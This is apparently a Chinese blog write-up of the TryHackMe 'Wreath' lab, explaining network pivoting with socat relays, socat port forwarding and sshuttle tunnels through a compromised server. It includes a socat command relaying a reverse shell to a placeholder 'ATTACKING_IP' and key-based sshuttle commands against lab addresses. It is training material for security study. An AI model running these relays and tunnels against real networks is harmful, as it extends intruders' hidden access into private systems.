<p>在这个场景中，我们使用 socat 创建一个中继，以便我们将反向 shell 发送回我们自己的攻击机器（如上图所示）。首先，让我们在攻击框 （） 上启动一个标准的 netcat 监听器。接下来，在受损的服务器上，使用以下命令启动中继：<code>sudo nc -lvnp 443</code><br><code>./socat tcp-l:8000 tcp:ATTACKING_IP:443 &amp;   </code></p>
<p><em><strong>注意：</strong>这两个地址的顺序在这里很重要。确保先打开侦听端口，_然后再_连接回攻击机器。</em>  </p>
<p>然后，我们可以从这里创建一个反向 shell，指向受感染服务器上新打开的端口 8000。以下屏幕截图演示了这一点，在远程服务器上使用 netcat 模拟从目标服务器接收反向 shell：</p>
<p><a target="_blank" rel="noopener" href="https://assets.tryhackme.com/additional/wreath-network/e8740afb79ab.png" title="Demonstration of a socat reverse shell relay from the compromised target to the attacking machine using netcat to simulate sending a shell" class="gallery-item"><img src="https://assets.tryhackme.com/additional/wreath-network/e8740afb79ab.png" alt="Demonstration of a socat reverse shell relay from the compromised target to the attacking machine using netcat to simulate sending a shell"></a></p>
<p>上述命令的简要说明：</p>
<ul>
<li><code>tcp-l:8000</code>用于创建连接的前半部分 – 目标计算机的 TCP 端口 8000 上的 IPv4 侦听器。</li>
<li><code>tcp:ATTACKING_IP:443</code>在端口 443 上连接回我们的本地 IP。显然，需要正确填写ATTACKING_IP才能正常工作。</li>
<li><code>&amp;</code>将侦听器置于后台，将其转换为 Job，以便我们仍然可以使用 shell 来执行其他命令。</li>
</ul>
<p>中继连接回使用标准 netcat 侦听器的别名启动的侦听器：。<code>sudo nc -lvnp 443</code>  </p>
<p>通过这种方式，我们可以设置一个中继，通过受感染的系统发送反向 shell，回到我们自己的攻击机器。这种技术也可以很容易地被链接起来;但是，在许多情况下，仅上传 Netcat 的静态副本以直接在受感染的服务器上接收反向 shell 可能更容易。</p>
<hr>
<p><strong>端口转发 – Easy</strong></p>
<p><a target="_blank" rel="noopener" href="https://assets.tryhackme.com/additional/wreath-network/YzM2ZWVlOGU5.png" class="gallery-item"><img src="https://assets.tryhackme.com/additional/wreath-network/YzM2ZWVlOGU5.png"></a>使用 socat 设置端口转发的快速简便的方法非常简单，就是在受感染的服务器上打开一个侦听端口，并将进入其中的任何内容重定向到目标服务器。例如，如果受损的服务器是 172.16.0.5，目标是 172.16.0.10 的端口 3306，我们可以使用以下命令（在受损的服务器上）创建端口转发：<br><code>./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &amp;   </code></p>
<p>这会在受感染的服务器上打开端口 33060，并将来自攻击机器的输入直接重定向到预期的目标服务器，基本上让我们可以访问在我们的目标 172.16.0.10 上运行的（可能是 MySQL 数据库）。该选项用于将每个连接放入新进程中，该选项表示在建立连接后端口保持打开状态。它们结合起来，允许我们对多个连接使用相同的端口转发。我们再次用于 shell 的后台，允许我们在受感染的服务器上继续使用相同的终端会话来处理其他事情。<code>fork``reuseaddr``&amp;</code></p>
<p>现在，我们可以连接到中继 （172.16.0.5） 上的端口 33060，并将我们的连接直接中继到我们的预期目标 172.16.0.10：3306。</p>
<hr>
<p><strong>端口转发 – 安静</strong></p>
<p>以前的技术既快速又简单，但它也会在受感染的服务器上打开一个端口，该端口可能会被任何类型的主机或网络扫描发现。虽然风险并不_大_，但了解一种稍微安静的 socat 端口转运方法是值得的。此方法稍微复杂一些，但不需要在受感染的服务器上从外部打开端口。</p>
<p>首先，在我们自己的攻击机器上，我们发出以下命令：<br><code>socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &amp;</code></p>
<p>这将打开两个端口：8000 和 8001，从而创建一个本地端口中继。进入其中一个的东西会从另一个出来。因此，端口 8000 还设置了 and 选项，以允许我们使用此端口转发创建多个连接。<code>fork``reuseaddr</code></p>
<p>接下来，在受损的中继服务器（上一个示例中为 172.16.0.5）上，我们执行以下命令：<br><code>./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &amp;   </code></p>
<p>这会在攻击机器上的监听端口 8001 和目标服务器的开放端口之间建立连接。要使用之前的虚构网络，我们可以输入以下命令：<br><code>./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &amp;   </code></p>
<p>这将在我们的攻击机器上的端口 8000 和预期目标 （172.16.0.10） 上的端口 80 之间创建一个链接，这意味着我们可以在攻击机器的 Web 浏览器中加载目标提供的网页：172.16.0.10：80！<code>localhost:8000</code></p>
<p>这是一个相当复杂的可视化场景，因此让我们快速了解一下当您尝试在浏览器中访问网页时会发生什么：</p>
<p><a target="_blank" rel="noopener" href="https://assets.tryhackme.com/additional/wreath-network/ZjA0YmEzMzVl.png" class="gallery-item"><img src="https://assets.tryhackme.com/additional/wreath-network/ZjA0YmEzMzVl.png"></a></p>
<ul>
<li>请求将转到<code>127.0.0.1:8000</code></li>
<li>由于我们在自己的机器上启动了 socat 侦听器，任何进入端口 8000 的东西都会从端口 8001 出来</li>
<li>端口 8001 直接连接到我们在受感染服务器上运行的 socat 进程，这意味着从端口 8001 传出的任何内容都会被发送到受感染的服务器，在那里它被中继到目标服务器上的端口 80。</li>
</ul>
<p>然后，当目标发送响应时，该过程将反转：</p>
<ul>
<li>响应将发送到受感染服务器上的 socat 进程。进入进程的内容从另一端出来，恰好直接链接到我们攻击机器上的端口 8001。</li>
<li>进入我们攻击机器上端口 8001 的任何内容都来自我们攻击机器上的端口 8000，这是 Web 浏览器希望接收其响应的地方，因此页面被接收和呈现。</li>
</ul>
<p>我们现在实现了与以前相同的目标，但没有在服务器上打开任何端口！  </p>
<hr>
<p>最后，我们已经学习了如何_创建_后台 socat 端口转发和中继，但知道如何_关闭_它们也很重要。解决方案很简单：在终端中运行命令，然后使用 ：<code>jobs``kill %NUMBER</code></p>
<p><a target="_blank" rel="noopener" href="https://assets.tryhackme.com/additional/wreath-network/61ca87aa4350.png" title="Demonstration for how to kill background jobs" class="gallery-item"><img src="https://assets.tryhackme.com/additional/wreath-network/61ca87aa4350.png" alt="Demonstration for how to kill background jobs"></a></p>
<p>这个工具与我们到目前为止介绍的其他工具完全不同。它不执行端口转发，它创建的代理与我们已经看到的完全不同。相反，它使用 SSH 连接来创建隧道代理，其作用类似于新接口。简而言之，它模拟了一个 VPN，允许我们通过代理路由我们的流量_，而无需使用 proxychains_（或等效的）。我们可以像通常连接到联网设备一样直接连接到目标网络中的设备。由于它通过 SSH（安全 shell）创建隧道，因此我们通过隧道发送的任何内容也被加密，这是一个不错的奖励。我们完全在攻击机器上使用 sshutt，就像我们通过 SSH 连接到远程服务器一样。  </p>
<p>虽然这听起来像是一个令人难以置信的升级，但它并非没有缺点。首先，sshuttle 仅适用于 Linux 目标。它还需要通过 SSH 访问受感染的服务器，并且还需要在服务器上安装 Python。也就是说，通过 SSH 访问，理论上可以上传 Python 的静态副本并使用它。这些限制确实在一定程度上限制了 sshuttle 的用途;然而，当_它是一个_选项时，它往往是一个极好的赌注！</p>
<p>首先，我们需要安装 sshuttle。在 Kali 上，这就像使用包管理器一样简单：<code>apt</code><br><code>sudo apt install sshuttle</code>  </p>
<hr>
<p>使用 sshuttle 连接到服务器的基本命令如下：<br><code>sshuttle -r username@address subnet</code>   </p>
<p>例如，在我们虚构的 172.16.0.x 网络中，服务器位于 172.16.0.5 并遭到入侵，命令可能如下所示：<br><code>sshuttle -r user@172.16.0.5 172.16.0.0/24</code>  </p>
<p>然后，系统会要求我们输入用户的密码，并建立代理。然后，该工具将被动地位于后台，并将相关流量转发到目标网络。  </p>
<p>除了指定子网，我们还可以使用选项，该选项尝试根据受感染服务器自己的路由表自动确定它们：<code>-N</code><br><code>sshuttle -r username@address -N</code>  </p>
<p>请记住，这可能并不总是成功的！  </p>
<p>与以前的工具一样，这些命令也可以通过在末尾附加 &amp; （） 符号来作为后台。<code>&amp;</code></p>
<p>如果这有效，您应该会看到以下行：<br><code>c : Connected to server.</code>  </p>
<hr>
<p>嗯，这很好，但是如果我们没有用户的密码，或者服务器只接受基于密钥的身份验证，会发生什么情况呢？</p>
<p>不幸的是，sshuttle 目前似乎没有指定用于向服务器进行身份验证的私钥的简写。也就是说，我们可以使用开关轻松绕过此限制。<code>--ssh-cmd</code></p>
<p>此开关允许我们指定在尝试对受感染的服务器进行身份验证时由 sshuttle 执行的命令。默认情况下，这没有参数。通过开关，我们可以选择不同的命令来执行身份验证：例如，，！<code>ssh``--ssh-cmd``ssh -i keyfile</code></p>
<p>因此，当使用基于密钥的身份验证时，最终命令如下所示：<br><code>sshuttle -r user@address --ssh-cmd &quot;ssh -i KEYFILE&quot; SUBNET</code>  </p>
<p>使用我们之前的示例，命令将是：<br><code>sshuttle -r user@172.16.0.5 --ssh-cmd &quot;ssh -i private_key&quot; 172.16.0.0/24</code>  </p>
<hr>
<p><strong>请注意：</strong>使用 sshuttle 时，您可能会遇到如下所示的错误：<br><code>client: Connected.   client_loop: send disconnect: Broken pipe   client: fatal: server died with error code 255</code>  </p>
<p>当您连接到的受感染计算机是您尝试访问的子网的一部分时，可能会发生这种情况。例如，如果我们连接到 172.16.0.5 并尝试转发 172.16.0.0&#x2F;24，那么我们会将受感染的服务器包含在新转发的子网中，从而中断连接并导致工具死机。</p>
<p>为了解决这个问题，我们告诉 sshuttle 使用交换机从子网范围中排除受感染的服务器。<code>-x</code></p>
<p>使用我们之前的示例：<br><code>sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5</code>  </p>
<p>这将允许 sshuttle 在不中断自身的情况下创建连接。</p>
<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p><a href="/../assets/img/Pasted%20image%2020241121165626.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121165626.png"></a></p>
<p><a href="/../assets/img/Pasted%20image%2020241121170006.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121170006.png"></a></p>
<p><a href="/../assets/img/Pasted%20image%2020241121170243.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121170243.png"></a></p>
<p>代理隧道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshuttle -r root@10.200.85.200 --ssh-cmd &quot;ssh -i id_rsa&quot; 10.200.85.200/24 -x 10.200.85.200</span><br></pre></td></tr></table></figure>


<p><a href="/../assets/img/Pasted%20image%2020241121171018.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121171018.png"></a></p>
<h2 id="📚-知识点回顾"><a href="#📚-知识点回顾" class="headerlink" title="📚 知识点回顾"></a>📚 知识点回顾</h2><ul>
<li><strong>信息搜集技巧</strong>：<ul>
<li>端口扫描与服务枚举技巧。</li>
<li>Web 漏洞检测技巧（SQL 注入、XSS 等）。</li>
</ul>
</li>
<li><strong>漏洞利用技巧</strong>：<ul>
<li>如何使用 Metasploit 或自行编写漏洞利用脚本。</li>
<li>获取反向 shell 与持续访问。</li>
</ul>
</li>
<li><strong>Post-Exploitation 技巧</strong>：<ul>
<li>获取目标的敏感信息和访问权限。</li>
<li>提升权限，进行横向移动。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="🧳-攻击链与流程图"><a href="#🧳-攻击链与流程图" class="headerlink" title="🧳 攻击链与流程图"></a>🧳 攻击链与流程图</h2><ul>
<li>可视化渗透测试的整体攻击过程，确保每一步都清晰。</li>
</ul>
<hr>
<h2 id="📅-总结"><a href="#📅-总结" class="headerlink" title="📅 总结"></a>📅 总结</h2><ul>
<li><strong>成功步骤</strong>：简要描述成功的渗透测试步骤和关键点。</li>
<li><strong>遇到的困难与挑战</strong>：列出在过程中遇到的难点及解决方案。</li>
<li><strong>后续建议</strong>：对靶场的进一步探索或防御建议。</li>
</ul>
</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a href="/tags/">标签</a></li>
        
          <li><a href="/sites/">站点</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/feesec">项目</a></li>
        
          <li><a href="/search/">搜索</a></li>
        
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%9A%80-%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">🚀 靶场概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8B-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">📋 基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">🔍 信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%F0%9F%9B%A0%EF%B8%8F-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 🛠️ 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%F0%9F%94%8E-%E8%B7%AF%E5%BE%84%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 🔎 路径探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%F0%9F%A7%B0-%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 🧰 服务枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">🧠 渗透思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E2%9A%A1-%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. ⚡ 攻击向量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%F0%9F%92%A5-nday-%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. 💥 nday 利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%F0%9F%94%8D-%E4%BF%A1%E6%81%AF%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. 🔍 信息审计</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8C%90-Web-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.4.</span> <span class="toc-text">🌐 Web 渗透测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%90-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%90%8E%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C"><span class="toc-number">1.5.</span> <span class="toc-text">🔐 横向移动与后渗透操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%95%B5%EF%B8%8F%E2%80%8D%E2%99%82%EF%B8%8F-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.</span> <span class="toc-text">🕵️‍♂️ 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A"><span class="toc-number">1.6.1.</span> <span class="toc-text">漏洞名称：&lt;漏洞名称&gt;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%BB-getshell"><span class="toc-number">1.7.</span> <span class="toc-text">💻 getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A8-%E6%8F%90%E6%9D%83"><span class="toc-number">1.8.</span> <span class="toc-text">🔨 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E5%92%8C%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">1.9.</span> <span class="toc-text">隧道代理和端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.10.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9A-%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.11.</span> <span class="toc-text">📚 知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%B3-%E6%94%BB%E5%87%BB%E9%93%BE%E4%B8%8E%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">1.12.</span> <span class="toc-text">🧳 攻击链与流程图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%85-%E6%80%BB%E7%BB%93"><span class="toc-number">1.13.</span> <span class="toc-text">📅 总结</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://feesec.github.io/2024/11/21/wreath/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://feesec.github.io/2024/11/21/wreath/&text=THM-wreath"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://feesec.github.io/2024/11/21/wreath/&title=THM-wreath"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://feesec.github.io/2024/11/21/wreath/&is_video=false&description=THM-wreath"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=THM-wreath&body=Check out this article: https://feesec.github.io/2024/11/21/wreath/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://feesec.github.io/2024/11/21/wreath/&title=THM-wreath"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://feesec.github.io/2024/11/21/wreath/&title=THM-wreath"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://feesec.github.io/2024/11/21/wreath/&title=THM-wreath"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://feesec.github.io/2024/11/21/wreath/&title=THM-wreath"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://feesec.github.io/2024/11/21/wreath/&name=THM-wreath&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://feesec.github.io/2024/11/21/wreath/&t=THM-wreath"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
      
        
          2016-2024
            Leon
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       -->
          <li><a href="/">
              首页
            </a></li><!--
     -->
          <!--
       -->
          <li><a href="/archives/">
              归档
            </a></li><!--
     -->
          <!--
       -->
          <li><a href="/tags/">
              标签
            </a></li><!--
     -->
          <!--
       -->
          <li><a href="/sites/">
              站点
            </a></li><!--
     -->
          <!--
       -->
          <li><a target="_blank" rel="noopener" href="http://github.com/feesec">
              项目
            </a></li><!--
     -->
          <!--
       -->
          <li><a href="/search/">
              搜索
            </a></li><!--
     -->
          <!--
       -->
          <li><a href="/about/">
              关于
            </a></li><!--
     -->
          
      </ul>
    </nav>
  </div>
  <div class="footer-center">
    
      <!-- 不蒜子统计 -->
      <span id="busuanzi_container_site_pv">
        总访问量<span id="busuanzi_value_site_pv"></span>次
      </span>
      <span class="post-meta-divider">|</span>
      <span id="busuanzi_container_site_uv" style='display:none'>
        访客数<span id="busuanzi_value_site_uv"></span>人
      </span>
      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
      
  </div>
</footer>
    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'feesec/Talk';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'photon-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>



<!-- FancyBox -->

  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
  
</body>
</html>
